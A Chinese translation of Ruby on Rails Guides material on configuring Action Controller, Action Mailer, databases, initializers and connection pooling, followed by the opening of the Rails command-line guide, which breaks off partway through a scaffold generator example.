###  3.7 3设置 Action Controller

config.action_controller 包含以下设置项：

    config.action_controller.asset_host：设置静态资源的主机，不用程序的服务器伺服静态资源，而使用 CDN。

    config.action_controller.perform_caching：设置程序是否要缓存。在开发模式中为 false，生产环境中为 true。

    config.action_controller.default_static_extension：设置缓存文件的扩展名，默认为 .html。

    config.action_controller.default_charset：设置默认字符集，默认为 utf-8。

    config.action_controller.logger：接受一个实现了 Log4r 接口的类，或者使用默认的 Logger 类，用于写 Action Controller 中的日志消息。设为 nil 禁用日志。

    config.action_controller.request_forgery_protection_token：设置请求伪造保护的权标参数名。默认情况下调用 protect_from_forgery 方法，将其设为 :authenticity_token。

    config.action_controller.allow_forgery_protection：是否启用跨站请求伪造保护功能。在测试环境中默认为 false，其他环境中默认为 true。

    config.action_controller.relative_url_root：用来告知 Rails 程序部署在子目录中。默认值为 ENV['RAILS_RELATIVE_URL_ROOT']。

    config.action_controller.permit_all_parameters：设置默认允许在批量赋值中使用的参数，默认为 false。

    config.action_controller.action_on_unpermitted_parameters：发现禁止使用的参数时，写入日志还是抛出异常（分别设为 :log 和 :raise）。在开发环境和测试环境中的默认值为 :log，在其他环境中的默认值为 false。

###  3.8 3设置 Action Dispatch

    config.action_dispatch.session_store：设置存储会话的方式，默认为 :cookie_store，其他可用值有：:active_record_store，:mem_cache_store，以及自定义类的名字。

    config.action_dispatch.default_headers：一个 Hash，设置响应的默认报头。默认设定的报头为：

config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '1; mode=block',
  'X-Content-Type-Options' => 'nosniff'
}

    config.action_dispatch.tld_length：设置顶级域名（top-level domain，简称 TLD）的长度，默认为 1。

    config.action_dispatch.http_auth_salt：设置 HTTP Auth 认证的加盐值，默认为 'http authentication'。

    config.action_dispatch.signed_cookie_salt：设置签名 cookie 的加盐值，默认为 'signed cookie'。

    config.action_dispatch.encrypted_cookie_salt：设置加密 cookie 的加盐值，默认为 'encrypted cookie'。

    config.action_dispatch.encrypted_signed_cookie_salt：设置签名加密 cookie 的加盐值，默认为 'signed encrypted cookie'。

    config.action_dispatch.perform_deep_munge：设置是否在参数上调用 deep_munge 方法。详情参阅“Rails 安全指南”一文。默认值为 true。

    ActionDispatch::Callbacks.before：设置在处理请求前运行的代码块。

    ActionDispatch::Callbacks.to_prepare：设置在 ActionDispatch::Callbacks.before 之后、处理请求之前运行的代码块。这个代码块在开发环境中的每次请求中都会运行，但在生产环境或 cache_classes 设为 true 的环境中只运行一次。

    ActionDispatch::Callbacks.after：设置处理请求之后运行的代码块。

###  3.9 3设置 Action View

config.action_view 包含以下设置项：

    config.action_view.field_error_proc：设置用于生成 Active Record 表单错误的 HTML，默认为：

Proc.new do |html_tag, instance|
  %Q(<div class="field_with_errors">#{html_tag}</div>).html_safe
end

    config.action_view.default_form_builder：设置默认使用的表单构造器。默认值为 ActionView::Helpers::FormBuilder。如果想让表单构造器在程序初始化完成后加载（在开发环境中每次请求都会重新加载），可使用字符串形式。

    config.action_view.logger：接受一个实现了 Log4r 接口的类，或者使用默认的 Logger 类，用于写入来自 Action View 的日志。设为 nil 禁用日志。

    config.action_view.erb_trim_mode：设置 ERB 使用的删除空白模式，默认为 '-'，使用 <%= -%> 或 <%= =%> 时，删除行尾的空白和换行。详情参阅 Erubis 的文档。

    config.action_view.embed_authenticity_token_in_remote_forms：设置启用 :remote => true 选项的表单如何处理 authenticity_token 字段。默认值为 false，即不加入 authenticity_token 字段，有助于使用片段缓存缓存表单。远程表单可从 meta 标签中获取认证权标，因此没必要再加入 authenticity_token 字段，除非要支持没启用 JavaScript 的浏览器。如果要支持没启用 JavaScript 的浏览器，可以在表单的选项中加入 :authenticity_token => true，或者把这个设置设为 true。

    config.action_view.prefix_partial_path_with_controller_namespace：设置渲染命名空间中的控制器时是否要在子文件夹中查找局部视图。例如，控制器名为 Admin::PostsController，渲染了以下视图：

<%= render @post %>

这个设置的默认值为 true，渲染的局部视图为 /admin/posts/_post.erb。如果设为 false，就会渲染 /posts/_post.erb，和没加命名空间的控制器（例如 PostsController）行为一致。

    config.action_view.raise_on_missing_translations：找不到翻译时是否抛出异常。

3.10 3设置 Action Mailer

config.action_mailer 包含以下设置项：

    config.action_mailer.logger：接受一个实现了 Log4r 接口的类，或者使用默认的 Logger 类，用于写入来自 Action Mailer 的日志。设为 nil 禁用日志。

    config.action_mailer.smtp_settings：详细设置 :smtp 发送方式。接受一个 Hash，包含以下选项：
        :address：设置远程邮件服务器，把默认值 "localhost" 改成所需值即可；
        :port：如果邮件服务器不使用端口 25，可通过这个选项修改；
        :domain：如果想指定一个 HELO 域名，可通过这个选项修改；
        :user_name：如果所用邮件服务器需要身份认证，可通过这个选项设置用户名；
        :password：如果所用邮件服务器需要身份认证，可通过这个选项设置密码；
        :authentication：如果所用邮件服务器需要身份认证，可通过这个选项指定认证类型，可选值包括：:plain，:login，:cram_md5；

    config.action_mailer.sendmail_settings：详细设置 sendmail 发送方式。接受一个 Hash，包含以下选项：
        :location：sendmail 可执行文件的位置，默认为 /usr/sbin/sendmail；
        :arguments：传入命令行的参数，默认为 -i -t；

    config.action_mailer.raise_delivery_errors：如果无法发送邮件，是否抛出异常。默认为 true。

    config.action_mailer.delivery_method：设置发送方式，默认为 :smtp。详情参阅“Action Mailer 基础”一文中的“设置”一节。。

    config.action_mailer.perform_deliveries：设置是否真的发送邮件，默认为 true。测试时可设为 false。

    config.action_mailer.default_options：设置 Action Mailer 的默认选项。可设置各个邮件发送程序的 from 或 reply_to 等选项。默认值为：

mime_version:  "1.0",
charset:       "UTF-8",
content_type: "text/plain",
parts_order:  ["text/plain", "text/enriched", "text/html"]
设置时要使用 Hash：
config.action_mailer.default_options = {
  from: "noreply@example.com"
}

    config.action_mailer.observers：注册邮件发送后触发的监控器。

config.action_mailer.observers = ["MailObserver"]

    config.action_mailer.interceptors：注册发送邮件前调用的拦截程序。

config.action_mailer.interceptors = ["MailInterceptor"]
3.11 3设置 Active Support

Active Support 包含以下设置项：

    config.active_support.bare：启动 Rails 时是否加载 active_support/all。默认值为 nil，即加载 active_support/all。

    config.active_support.escape_html_entities_in_json：在 JSON 格式的数据中是否转义 HTML 实体。默认为 false。

    config.active_support.use_standard_json_time_format：在 JSON 格式的数据中是否把日期转换成 ISO 8601 格式。默认为 true。

    config.active_support.time_precision：设置 JSON 编码的时间精度，默认为 3。

    ActiveSupport::Logger.silencer：设为 false 可以静默代码块中的日志消息。默认为 true。

    ActiveSupport::Cache::Store.logger：设置缓存存储中使用的写日志程序。

    ActiveSupport::Deprecation.behavior：作用和 config.active_support.deprecation 一样，设置是否显示 Rails 废弃提醒。

    ActiveSupport::Deprecation.silence：接受一个代码块，静默废弃提醒。

    ActiveSupport::Deprecation.silenced：设置是否显示废弃提醒。

3.12 3设置数据库

几乎每个 Rails 程序都要用到数据库。数据库信息可以在环境变量 ENV['DATABASE_URL'] 中设定，也可在 config/database.yml 文件中设置。

在 config/database.yml 文件中可以设置连接数据库所需的所有信息：
development:
  adapter: postgresql
  database: blog_development
  pool: 5

上述设置使用 postgresql 适配器连接名为 blog_development 的数据库。这些信息也可存储在 URL 中，通过下面的环境变量提供：
> puts ENV['DATABASE_URL']
postgresql://localhost/blog_development?pool=5

config/database.yml 文件包含三个区域，分别对应 Rails 中的三个默认环境：

    development 环境在本地开发电脑上运行，手动与程序交互；
    test 环境用于运行自动化测试；
    production 环境用于部署后的程序；

如果需要使用 URL 形式，也可在 config/database.yml 文件中按照下面的方式设置：
development:
  url: postgresql://localhost/blog_development?pool=5

config/database.yml 文件中可以包含 ERB 标签 <%= %>。这个标签中的代码被视为 Ruby 代码。使用 ERB 标签可以从环境变量中获取数据，或者计算所需的连接信息。

你无须手动更新数据库设置信息。查看新建程序生成器，会发现一个名为 --database 的选项。使用这个选项可以从一组常用的关系型数据库中选择想用的数据库。甚至还可重复执行生成器：cd .. && rails new blog --database=mysql。确认覆盖文件 config/database.yml 后，程序就设置成使用 MySQL，而不是 SQLite。常用数据库的设置如下所示。
3.13 3连接设置

既然数据库的连接信息有两种设置方式，就要知道两者之间的关系。

如果 config/database.yml 文件为空，而且设置了环境变量 ENV['DATABASE_URL']，Rails 就会使用环境变量连接数据库：
$ cat config/database.yml
 
$ echo $DATABASE_URL
postgresql://localhost/my_database

如果 config/database.yml 文件存在，且没有设置环境变量 ENV['DATABASE_URL']，Rails 会使用设置文件中的信息连接数据库：
$ cat config/database.yml
development:
  adapter: postgresql
  database: my_database
  host: localhost
 
$ echo $DATABASE_URL

如果有 config/database.yml 文件，也设置了环境变量 ENV['DATABASE_URL']，Rails 会合并二者提供的信息。下面举个例子说明。

如果二者提供的信息有重复，环境变量中的信息优先级更高：
$ cat config/database.yml
development:
  adapter: sqlite3
  database: NOT_my_database
  host: localhost
 
$ echo $DATABASE_URL
postgresql://localhost/my_database
 
$ rails runner 'puts ActiveRecord::Base.connections'
{"development"=>{"adapter"=>"postgresql", "host"=>"localhost", "database"=>"my_database"}}

这里的适配器、主机和数据库名都和 ENV['DATABASE_URL'] 中的信息一致。

如果没有重复，则会从这两个信息源获取信息。如果有冲突，环境变量的优先级更高。
$ cat config/database.yml
development:
  adapter: sqlite3
  pool: 5
 
$ echo $DATABASE_URL
postgresql://localhost/my_database
 
$ rails runner 'puts ActiveRecord::Base.connections'
{"development"=>{"adapter"=>"postgresql", "host"=>"localhost", "database"=>"my_database", "pool"=>5}}

因为 ENV['DATABASE_URL'] 中没有提供数据库连接池信息，所以从设置文件中获取。二者都提供了 adapter 信息，但使用的是 ENV['DATABASE_URL'] 中的信息。

如果完全不想使用 ENV['DATABASE_URL'] 中的信息，要使用 url 子建指定一个 URL：
$ cat config/database.yml
development:
  url: sqlite3://localhost/NOT_my_database
 
$ echo $DATABASE_URL
postgresql://localhost/my_database
 
$ rails runner 'puts ActiveRecord::Base.connections'
{"development"=>{"adapter"=>"sqlite3", "host"=>"localhost", "database"=>"NOT_my_database"}}

如上所示，ENV['DATABASE_URL'] 中的连接信息被忽略了，使用了不同的适配器和数据库名。

既然 config/database.yml 文件中可以使用 ERB，最好使用 ENV['DATABASE_URL'] 中的信息连接数据库。这种方式在生产环境中特别有用，因为我们并不想把数据库密码等信息纳入版本控制系统（例如 Git）。
$ cat config/database.yml
production:
  url: <%= ENV['DATABASE_URL'] %>

注意，这种设置方式很明确，只使用 ENV['DATABASE_URL'] 中的信息。
3.13.1 4设置 SQLite3 数据库

Rails 内建支持 SQLite3。SQLite 是个轻量级数据库，无需单独的服务器。大型线上环境可能并不适合使用 SQLite，但在开发环境和测试环境中使用却很便利。新建程序时，Rails 默认使用 SQLite，但可以随时换用其他数据库。

下面是默认的设置文件（config/database.yml）中针对开发环境的数据库设置：
development:
  adapter: sqlite3
  database: db/development.sqlite3
  pool: 5
  timeout: 5000

Rails 默认使用 SQLite3 存储数据，因为 SQLite3 无需设置即可使用。Rails 还内建支持 MySQL 和 PostgreSQL。还提供了很多插件，支持更多的数据库系统。如果在生产环境中使用了数据库，Rails 很可能已经提供了对应的适配器。
3.13.2 4设置 MySQL 数据库

如果不想使用 SQLite3，而是使用 MySQL，config/database.yml 文件的内容会有些不同。下面是针对开发环境的设置：
development:
  adapter: mysql2
  encoding: utf8
  database: blog_development
  pool: 5
  username: root
  password:
  socket: /tmp/mysql.sock

如果开发电脑中的 MySQL 使用 root 用户，且没有密码，可以直接使用上述设置。否则就要相应的修改用户名和密码。
3.13.3 4设置 PostgreSQL 数据库

如果选择使用 PostgreSQL，config/database.yml 会准备好连接 PostgreSQL 数据库的信息：
development:
  adapter: postgresql
  encoding: unicode
  database: blog_development
  pool: 5
  username: blog
  password:

PREPARE 语句可使用下述方法禁用：
production:
  adapter: postgresql
  prepared_statements: false
3.13.4 4在 JRuby 平台上设置 SQLite3 数据库

如果在 JRuby 中使用 SQLite3，config/database.yml 文件的内容会有点不同。下面是针对开发环境的设置：
development:
  adapter: jdbcsqlite3
  database: db/development.sqlite3
3.13.5 4在 JRuby 平台上设置 MySQL 数据库

如果在 JRuby 中使用 MySQL，config/database.yml 文件的内容会有点不同。下面是针对开发环境的设置：
development:
  adapter: jdbcmysql
  database: blog_development
  username: root
  password:
3.13.6 4在 JRuby 平台上设置 PostgreSQL 数据库

如果在 JRuby 中使用 PostgreSQL，config/database.yml 文件的内容会有点不同。下面是针对开发环境的设置：
development:
  adapter: jdbcpostgresql
  encoding: unicode
  database: blog_development
  username: blog
  password:

请相应地修改 development 区中的用户名和密码。
3.14 3新建 Rails 环境

默认情况下，Rails 提供了三个环境：开发，测试和生产。这三个环境能满足大多数需求，但有时需要更多的环境。

假设有个服务器镜像了生产环境，但只用于测试。这种服务器一般叫做“交付准备服务器”（staging server）。要想为这个服务器定义一个名为“staging”的环境，新建文件 config/environments/staging.rb 即可。请使用 config/environments 文件夹中的任一文件作为模板，以此为基础修改设置。

新建的环境和默认提供的环境没什么区别，可以执行 rails server -e staging 命令启动服务器，执行 rails console staging 命令进入控制台，Rails.env.staging? 也可使用。
3.15 3部署到子目录中

默认情况下，Rails 在根目录（例如 /）中运行程序。本节说明如何在子目录中运行程序。

假设想把网站部署到 /app1 目录中。生成路由时，Rails 要知道这个目录：
config.relative_url_root = "/app1"

或者，设置环境变量 RAILS_RELATIVE_URL_ROOT 也行。

这样设置之后，Rails 生成的链接都会加上前缀 /app1。
3.15.1 4使用 Passenger

使用 Passenger 时，在子目录中运行程序更简单。具体做法参见 Passenger 手册。
3.15.2 4使用反向代理

TODO
3.15.3 4部署到子目录时的注意事项

在生产环境中部署到子目录中会影响 Rails 的多个功能：

    开发环境
    测试环境
    伺服静态资源文件
    Asset Pipeline

##  4 Rails 环境设置

Rails 的某些功能只能通过外部的环境变量设置。下面介绍的环境变量可以被 Rails 识别：

    ENV["RAILS_ENV"]：指定 Rails 运行在哪个环境中：生成环境，开发环境，测试环境等。

    ENV["RAILS_RELATIVE_URL_ROOT"]：部署到子目录时，路由用来识别 URL。

    ENV["RAILS_CACHE_ID"] 和 ENV["RAILS_APP_VERSION"]：用于生成缓存扩展键。允许在同一程序中使用多个缓存。

##  5 使用初始化脚本

加载完框架以及程序中使用的 gem 后，Rails 会加载初始化脚本。初始化脚本是个 Ruby 文件，存储在程序的 config/initializers 文件夹中。初始化脚本可在框架和 gem 加载完成后做设置。

如果有需求，可以使用子文件夹组织初始化脚本，Rails 会加载整个 config/initializers 文件夹中的内容。

如果对初始化脚本的加载顺序有要求，可以通过文件名控制。初始化脚本的加载顺序按照文件名的字母表顺序进行。例如，01_critical.rb 在 02_normal.rb 之前加载。
##  6 初始化事件

Rails 提供了 5 个初始化事件，可做钩子使用。下面按照事件的加载顺序介绍：

    before_configuration：程序常量继承自 Rails::Application 之后立即运行。config 方法在此事件之前调用。

    before_initialize：在程序初始化过程中的 :bootstrap_hook 之前运行，接近初始化过程的开头。

    to_prepare：所有 Railtie（包括程序本身）的初始化都运行完之后，但在按需加载代码和构建中间件列表之前运行。更重要的是，在开发环境中，每次请求都会运行，但在生产环境和测试环境中只运行一次（在启动阶段）。

    before_eager_load：在按需加载代码之前运行。这是在生产环境中的默认表现，但在开发环境中不是。

    after_initialize：在程序初始化完成之后运行，即 config/initializers 文件夹中的初始化脚本运行完毕之后。

要想为这些钩子定义事件，可以在 Rails::Application、Rails::Railtie 或 Rails::Engine 的子类中使用代码块：
module YourApp
  class Application < Rails::Application
    config.before_initialize do
      # initialization code goes here
    end
  end
end

或者，在 Rails.application 对象上调用 config 方法：
Rails.application.config.before_initialize do
  # initialization code goes here
end

程序的某些功能，尤其是路由，在 after_initialize 之后还不可用。
###  6.1 3Rails::Railtie#initializer

Rails 中有几个初始化脚本使用 Rails::Railtie 的 initializer 方法定义，在程序启动时运行。下面这段代码摘自 Action Controller 中的 set_helpers_path 初始化脚本：
initializer "action_controller.set_helpers_path" do |app|
  ActionController::Helpers.helpers_path = app.helpers_paths
end

initializer 方法接受三个参数，第一个是初始化脚本的名字，第二个是选项 Hash（上述代码中没用到），第三个参数是代码块。参数 Hash 中的 :before 键指定在特定的初始化脚本之前运行，:after 键指定在特定的初始化脚本之后运行。

使用 initializer 方法定义的初始化脚本按照定义的顺序运行，但指定 :before 或 :after 参数的初始化脚本例外。

初始化脚本可放在任一初始化脚本的前面或后面，只要符合逻辑即可。假设定义了四个初始化脚本，名字为 "one" 到 "four"（就按照这个顺序定义），其中 "four" 在 "four" 之前，且在 "three" 之后，这就不符合逻辑，Rails 无法判断初始化脚本的加载顺序。

initializer 方法的代码块参数是程序实例，因此可以调用 config 方法，如上例所示。

因为 Rails::Application 直接继承自 Rails::Railtie，因此可在文件 config/application.rb 中使用 initializer 方法定义程序的初始化脚本。
###  6.2 3初始化脚本

下面列出了 Rails 中的所有初始化脚本，按照定义的顺序，除非特别说明，也按照这个顺序执行。

    load_environment_hook：只是一个占位符，让 :load_environment_config 在其前运行。

    load_active_support：加载 active_support/dependencies，加入 Active Support 的基础。如果 config.active_support.bare 为非真值（默认），还会加载 active_support/all。

    initialize_logger：初始化日志程序（ActiveSupport::Logger 对象），可通过 Rails.logger 调用。在此之前的初始化脚本中不能定义 Rails.logger。

    initialize_cache：如果还没创建 Rails.cache，使用 config.cache_store 指定的方式初始化缓存，并存入 Rails.cache。如果对象能响应 middleware 方法，对应的中间件会插入 Rack::Runtime 之前。

    set_clear_dependencies_hook：为 active_record.set_dispatch_hooks 提供钩子，在本初始化脚本之前运行。这个初始化脚本只有当 cache_classes 为 false 时才会运行，使用 ActionDispatch::Callbacks.after 从对象空间中删除请求过程中已经引用的常量，以便下次请求重新加载。

    initialize_dependency_mechanism：如果 config.cache_classes 为 true，设置 ActiveSupport::Dependencies.mechanism 使用 require 而不是 load 加载依赖件。

    bootstrap_hook：运行所有 before_initialize 代码块。

    i18n.callbacks：在开发环境中，设置一个 to_prepare 回调，调用 I18n.reload! 加载上次请求后修改的本地化翻译。在生产环境中这个回调只会在首次请求时运行。

    active_support.deprecation_behavior：设置各环境的废弃提醒方式，开发环境的方式为 :log，生产环境的方式为 :notify，测试环境的方式为 :stderr。如果没有为 config.active_support.deprecation 设定值，这个初始化脚本会提醒用户在当前环境的设置文件中设置。可以设为一个数组。

    active_support.initialize_time_zone：根据 config.time_zone 设置程序的默认时区，默认值为 "UTC"。

    active_support.initialize_beginning_of_week：根据 config.beginning_of_week 设置程序默认使用的一周开始日，默认值为 :monday。

    action_dispatch.configure：把 ActionDispatch::Http::URL.tld_length 设置为 config.action_dispatch.tld_length 指定的值。

    action_view.set_configs：根据 config.action_view 设置 Action View，把指定的方法名做为赋值方法发送给 ActionView::Base，并传入指定的值。

    action_controller.logger：如果还未创建，把 ActionController::Base.logger 设为 Rails.logger。

    action_controller.initialize_framework_caches：如果还未创建，把 ActionController::Base.cache_store 设为 Rails.cache。

    action_controller.set_configs：根据 config.action_controller 设置 Action Controller，把指定的方法名作为赋值方法发送给 ActionController::Base，并传入指定的值。

    action_controller.compile_config_methods：初始化指定的设置方法，以便快速访问。

    active_record.initialize_timezone：把 ActiveRecord::Base.time_zone_aware_attributes 设为 true，并把 ActiveRecord::Base.default_timezone 设为 UTC。从数据库中读取数据时，转换成 Time.zone 中指定的时区。

    active_record.logger：如果还未创建，把 ActiveRecord::Base.logger 设为 Rails.logger。

    active_record.set_configs：根据 config.active_record 设置 Active Record，把指定的方法名作为赋值方法传给 ActiveRecord::Base，并传入指定的值。

    active_record.initialize_database：从 config/database.yml 中加载数据库设置信息，并为当前环境建立数据库连接。

    active_record.log_runtime：引入 ActiveRecord::Railties::ControllerRuntime，这个模块负责把 Active Record 查询花费的时间写入日志。

    active_record.set_dispatch_hooks：如果 config.cache_classes 为 false，重置所有可重新加载的数据库连接。

    action_mailer.logger：如果还未创建，把 ActionMailer::Base.logger 设为 Rails.logger。

    action_mailer.set_configs：根据 config.action_mailer 设置 Action Mailer，把指定的方法名作为赋值方法发送给 ActionMailer::Base，并传入指定的值。

    action_mailer.compile_config_methods：初始化指定的设置方法，以便快速访问。

    set_load_path：在 bootstrap_hook 之前运行。把 vendor 文件夹、lib 文件夹、app 文件夹中的所有子文件夹，以及 config.load_paths 中指定的路径加入 $LOAD_PATH。

    set_autoload_paths：在 bootstrap_hook 之前运行。把 app 文件夹中的所有子文件夹，以及 config.autoload_paths 指定的路径加入 ActiveSupport::Dependencies.autoload_paths。

    add_routing_paths：加载所有 config/routes.rb 文件（程序中的，Railtie 中的，以及引擎中的），并创建程序的路由。

    add_locales：把 config/locales 文件夹中的所有文件（程序中的，Railties 中的，以及引擎中的）加入 I18n.load_path，让这些文件中的翻译可用。

    add_view_paths：把程序、Railtie 和引擎中的 app/views 文件夹加入视图文件查找路径。

    load_environment_config：加载 config/environments 文件夹中当前环境对应的设置文件。

    append_asset_paths：查找程序的静态资源文件路径，Railtie 中的静态资源文件路径，以及 config.static_asset_paths 中可用的文件夹。

    prepend_helpers_path：把程序、Railtie、引擎中的 app/helpers 文件夹加入帮助文件查找路径。

    load_config_initializers：加载程序、Railtie、引擎中 config/initializers 文件夹里所有的 Ruby 文件。这些文件可在框架加载后做设置。

    engines_blank_point：在初始化过程加入一个时间点，以防加载引擎之前要做什么处理。在这一点之后，会运行所有 Railtie 和引擎的初始化脚本。

    add_generator_templates：在程序、Railtie、引擎的 lib/templates 文件夹中查找生成器使用的模板，并把这些模板添加到 config.generators.templates，让所有生成器都能使用。

    ensure_autoload_once_paths_as_subset：确保 config.autoload_once_paths 只包含 config.autoload_paths 中的路径。如果包含其他路径，会抛出异常。

    add_to_prepare_blocks：把程序、Railtie、引擎中的 config.to_prepare 加入 Action Dispatch 的 to_prepare 回调中，这些回调在开发环境中每次请求都会运行，但在生产环境中只在首次请求前运行。

    add_builtin_route：如果程序运行在开发环境中，这个初始化脚本会把 rails/info/properties 添加到程序的路由中。这个路由对应的页面显示了程序的详细信息，例如 Rails 和 Ruby 版本。

    build_middleware_stack：构建程序的中间件列表，返回一个对象，可响应 call 方法，参数为 Rack 请求的环境对象。

    eager_load!：如果 config.eager_load 为 true，运行 config.before_eager_load 钩子，然后调用 eager_load!，加载所有 config.eager_load_namespaces 中的命名空间。

    finisher_hook：为程序初始化完成点提供一个钩子，还会运行程序、Railtie、引擎中的所有 config.after_initialize 代码块。

    set_routes_reloader：设置 Action Dispatch 使用 ActionDispatch::Callbacks.to_prepare 重新加载路由文件。

    disable_dependency_loading：如果 config.eager_load 为 true，禁止自动加载依赖件。

##  7 数据库连接池

Active Record 数据库连接由 ActiveRecord::ConnectionAdapters::ConnectionPool 管理，确保一个连接池的线程量限制在有限的数据库连接数之内。这个限制量默认为 5，但可以在文件 database.yml 中设置。
development:
  adapter: sqlite3
  database: db/development.sqlite3
  pool: 5
  timeout: 5000

因为连接池在 Active Record 内部处理，因此程序服务器（Thin，mongrel，Unicorn 等）要表现一致。一开始数据库连接池是空的，然后按需创建更多的链接，直到达到连接池数量限制为止。

任何一个请求在初次需要连接数据库时都要检查连接，请求处理完成后还会再次检查，确保后续连接可使用这个连接池。

如果尝试使用比可用限制更多的连接，Active Record 会阻塞连接，等待连接池分配新的连接。如果无法获得连接，会抛出如下所示的异常。
ActiveRecord::ConnectionTimeoutError - could not obtain a database connection within 5 seconds. The max pool size is currently 5; consider increasing it:

如果看到以上异常，可能需要增加连接池限制数量，方法是修改 database.yml 文件中的 pool 选项。

如果在多线程环境中运行程序，有可能多个线程同时使用多个连接。所以，如果程序的请求量很大，有可能出现多个线程抢用有限的连接。

## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Rails 命令行

读完本文，你将学到：

    如何新建 Rails 程序；
    如何生成模型、控制器、数据库迁移和单元测试；
    如何启动开发服务器；
    如果在交互 shell 中测试对象；
    如何分析、评测程序；

Chapters

    命令行基础
        rails new
        rails server
        rails generate
        rails console
        rails dbconsole
        rails runner
        rails destroy
    Rake
        about
        assets
        db
        doc
        notes
        routes
        test
        tmp
        其他任务
        编写 Rake 任务
    Rails 命令行高级用法
        新建程序时指定数据库和源码管理系统

阅读本文前要具备一些 Rails 基础知识，可以阅读“Rails 入门”一文。
##  1 命令行基础

有些命令在 Rails 开发过程中经常会用到，下面按照使用频率倒序列出：

    rails console
    rails server
    rake
    rails generate
    rails dbconsole
    rails new app_name

这些命令都可指定 -h 或 --help 选项显示具体用法。

下面我们来新建一个 Rails 程序，介绍各命令的用法。
###  1.1 rails new

安装 Rails 后首先要做的就是使用 rails new 命令新建 Rails 程序。

如果还没安装 Rails ，可以执行 gem install rails 命令安装。
$ rails new commandsapp
     create
     create  README.rdoc
     create  Rakefile
     create  config.ru
     create  .gitignore
     create  Gemfile
     create  app
     ...
     create  tmp/cache
     ...
        run  bundle install

这个简单的命令会生成很多文件，组成一个完整的 Rails 程序，直接就可运行。
###  1.2 rails server

rails server 命令会启动 Ruby 内建的小型服务器 WEBrick。要想在浏览器中访问程序，就要执行这个命令。

无需其他操作，执行 rails server 命令后就能运行刚创建的 Rails 程序：
$ cd commandsapp
$ rails server
=> Booting WEBrick
=> Rails 4.2.0 application starting in development on http://0.0.0.0:3000
=> Call with -d to detach
=> Ctrl-C to shutdown server
[2013-08-07 02:00:01] INFO  WEBrick 1.3.1
[2013-08-07 02:00:01] INFO  ruby 2.0.0 (2013-06-27) [x86_64-darwin11.2.0]
[2013-08-07 02:00:01] INFO  WEBrick::HTTPServer#start: pid=69680 port=3000

只执行了三个命令，我们就启动了一个 Rails 服务器，监听端口 3000。打开浏览器，访问 http://localhost:3000，会看到一个简单的 Rails 程序。

启动服务器的命令还可使用别名“s”：rails s。

如果想让服务器监听其他端口，可通过 -p 选项指定。所处的环境可由 -e 选项指定。
$ rails server -e production -p 4000

-b 选项把 Rails 绑定到指定的 IP，默认 IP 是 0.0.0.0。指定 -d 选项后，服务器会以守护进程的形式运行。
###  1.3 rails generate

rails generate 使用模板生成很多东西。单独执行 rails generate 命令，会列出可用的生成器：

还可使用别名“g”执行生成器命令：rails g。
$ rails generate
Usage: rails generate GENERATOR [args] [options]
 
...
...
 
Please choose a generator below.
 
Rails:
  assets
  controller
  generator
  ...
  ...

使用其他生成器 gem 可以安装更多的生成器，或者使用插件中提供的生成器，甚至还可以自己编写生成器。

使用生成器可以节省大量编写程序骨架的时间。

下面我们使用控制器生成器生成控制器。但应该使用哪个命令呢？我们问一下生成器：

所有的 Rails 命令都有帮助信息。和其他 *nix 命令一样，可以在命令后加上 --help 或 -h 选项，例如 rails server --help。
$ rails generate controller
Usage: rails generate controller NAME [action action] [options]
 
...
...
 
Description:
    ...
 
    To create a controller within a module, specify the controller name as a
    path like 'parent_module/controller_name'.
 
    ...
 
Example:
    `rails generate controller CreditCard open debit credit close`
 
    Credit card controller with URLs like /credit_card/debit.
        Controller: app/controllers/credit_card_controller.rb
        Test:       test/controllers/credit_card_controller_test.rb
        Views:      app/views/credit_card/debit.html.erb [...]
        Helper:     app/helpers/credit_card_helper.rb

控制器生成器接受的参数形式是 generate controller ControllerName action1 action2。下面我们来生成 Greetings 控制器，包含一个动作 hello，跟读者打个招呼。
$ rails generate controller Greetings hello
     create  app/controllers/greetings_controller.rb
      route  get "greetings/hello"
     invoke  erb
     create    app/views/greetings
     create    app/views/greetings/hello.html.erb
     invoke  test_unit
     create    test/controllers/greetings_controller_test.rb
     invoke  helper
     create    app/helpers/greetings_helper.rb
     invoke    test_unit
     create      test/helpers/greetings_helper_test.rb
     invoke  assets
     invoke    coffee
     create      app/assets/javascripts/greetings.js.coffee
     invoke    scss
     create      app/assets/stylesheets/greetings.css.scss

这个命令生成了什么呢？在程序中创建了一堆文件夹，还有控制器文件、视图文件、功能测试文件、视图帮助方法文件、JavaScript 文件盒样式表文件。

打开控制器文件（app/controllers/greetings_controller.rb），做些改动：
class GreetingsController < ApplicationController
  def hello
    @message = "Hello, how are you today?"
  end
end

然后修改视图文件（app/views/greetings/hello.html.erb），显示消息：
<h1>A Greeting for You!</h1>
<p><%= @message %></p>

执行 rails server 命令启动服务器：
$ rails server
=> Booting WEBrick...

要查看的地址是 http://localhost:3000/greetings/hello。

在常规的 Rails 程序中，URL 的格式是 http://(host)/(controller)/(action)，访问 http://(host)/(controller) 会进入控制器的 index 动作。

Rails 也为数据模型提供了生成器。
$ rails generate model
Usage:
  rails generate model NAME [field[:type][:index] field[:type][:index]] [options]
 
...
 
Active Record options:
      [--migration]            # Indicates when to generate migration
                               # Default: true
 
...
 
Description:
    Create rails files for model generator.

全部可用的字段类型，请查看 TableDefinition#column 方法的文档。

不过我们暂且不单独生成模型（后文再生成），先使用脚手架。Rails 中的脚手架会生成资源所需的全部文件，包括：模型，模型所用的迁移，处理模型的控制器，查看数据的视图，以及测试组件。

我们要创建一个名为“HighScore”的资源，记录视频游戏的最高得分。
$ rails generate scaffold HighScore game:string score:integer
    invoke  active_record
    create    db/migrate/20130717151933_create_high_scores.rb
    create    app/models/high_score.rb
    invoke    test_unit
    create      test/models/high_score_test.rb
    create      test/fixtures/high_scores.yml
    invoke  resource_route
     route    resources :high_scores
    invoke  scaffold_controller
    create    app/controllers/high_scores_controller.rb
    invoke    erb
    create      app/views/high_scores
    create      app/views/high_scores/index.html.erb
